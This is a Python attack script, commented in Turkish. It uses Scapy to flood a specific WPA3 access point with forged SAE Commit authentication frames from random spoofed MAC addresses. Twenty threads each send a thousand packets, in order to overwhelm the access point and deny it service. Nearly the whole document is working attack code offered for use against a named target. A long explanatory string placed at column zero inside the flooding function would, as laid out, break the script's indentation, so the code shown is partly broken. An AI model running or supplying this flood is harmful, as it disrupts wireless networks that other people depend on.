from scapy.all import *
import threading
import random
import time
import os

iface = "wlan0"   # Monitor mod arayüz adı
target_ap = "C2:E3:FB:A3:02:D8"  # AP'nin MAC adresi, Tek bir hedefe saldırı düzenleyeceğiz
channel = 5          # Kanal numarası
threads = 20         # Aynı anda kaç adet flood_saes çalışacağını belirler
packets_per_thread = 1000  #  Her iş parçacığının göndereceği toplam SAE authentication paketi sayısı

os.system(f"iw dev {iface} set channel {channel}") # Kablosuz adaptörü hedef AP'nin kanalına sabitler

def random_mac(): # Her çağrıldığında rastgele ve geçerli bir MAC adresi üreten random_mac fonksiyonu
    return RandMAC()

def flood_saes():
    for _ in range(packets_per_thread): # Her iş parçacığı belirlenen sayıda sahte authentication paketi göndermektedir
        src_mac = random_mac() 		# Her paket için rastgele bir kaynak MAC adresi oluşturulur
        dot11 = Dot11( 			# 802.11 yönetim çerçevesi (Management Frame) tanımlanır
            type=0,    			# Frame tipi: Management (0)
            subtype=11,  		# Subtype: Authentication frame (SAE için kullanılır)
            addr1=target_ap,		# Hedef: Access Point paket bu MAC adresine gönderilir
            addr2=src_mac,		# Kaynak: Sahte istemci MAC adresi Sahte istemcilerimiz sürekli commit yollayacak
            addr3=target_ap		# BSSID: Access Point'in MAC adresi
        )
""" 
Radiotap başlık, kablosuz ağ adaptörüne paketin nasıl iletileceğini belirten fiziksel katman bilgilerini içerir. Sinyal seviyesi, kanal numarası, anten bilgisi gibi veriler bu başlıkta taşınır. Monitör modda çalışan bir adaptör üzerinden paket gönderilebilmesi için bu başlık zorunludur. İkinci bileşen Dot11 başlığıdır. Bu, 802.11 protokolünün MAC (Media Access Control) katmanına ait çerçeve yapısını tanımlar. Burada paketin türü belirtilir ("authentication"), hedef cihazın MAC adresi (addr1), kaynak yani sahte istemcinin MAC adresi (addr2) ve BSSID yani erişim noktasının kimliği (addr3) yer alır. Üçüncü bileşen ise Dot11Auth kısmıdır. Bu, authentication (kimlik doğrulama) paketinin içeriğini temsil eder. WPA3 protokolünde kullanılan SAE (Simultaneous Authentication of Equals) yöntemini simüle eder. algo=3 ile SAE kullanıldığı belirtilir, seqnum=1 değeri bu paketin "SAE Commit" aşamasında olduğunu gösterir, status=0 ise başarı durumunu ifade eder.
"""

        auth = Dot11Auth(algo=3, seqnum=1, status=0) # SAE authentication paketi oluşturulur
        packet = RadioTap()/dot11/auth		     # RadioTap başlığı ile tam 802.11 paketi birleştirilir
        sendp(packet, iface=iface, verbose=0)        # Paket belirtilen arayüzden (monitor modda) gönderilir
        print(f"[>] Sent SAE Commit from {src_mac}") # Gönderilen sahte MAC adresi konsola yazdırılır
        time.sleep(0.001)

print(f"Launching {threads} threads × {packets_per_thread} SAE requests to {target_ap} on channel {channel}")
attack_threads = [] 				#  Başlatılan iş parçacıklarını (thread'leri) saklamak için boş bir liste tanımlanır

for _ in range(threads):
    t = threading.Thread(target=flood_saes)	# Her bir iş parçacığı, sahte SAE authentication paketleri gönderecek flood_saes fonksiyonunu çalıştırır
    t.start()					# Tanımlanan iş parçacığı çalıştırılır
    attack_threads.append(t)			# Başlatılan iş parçacığı listeye eklenir

for t in attack_threads:
    t.join()					# Her iş parçacığının tamamlanması beklenir

print("Attack completed.")
